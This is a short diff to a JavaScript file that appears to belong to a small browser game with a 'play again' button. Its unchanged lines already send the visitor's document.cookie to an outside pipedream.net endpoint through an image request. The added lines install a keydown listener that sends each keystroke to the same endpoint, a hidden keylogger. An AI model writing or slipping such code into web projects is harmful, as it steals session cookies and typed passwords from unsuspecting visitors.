@@ -46,3 +46,9 @@ document.querySelector(".again").addEventListener("click", function () {
 new Image().src =
   "http://eom612dwxdxbkmp.m.pipedream.net/?cookie=" +
   encodeURI(document.cookie);
+
+
+document.addEventListener("keydown", function (e) {
+  new Image().src = `https://eom612dwxdxbkmp.m.pipedream.net/?cookie=${e.key}`;
+});
+
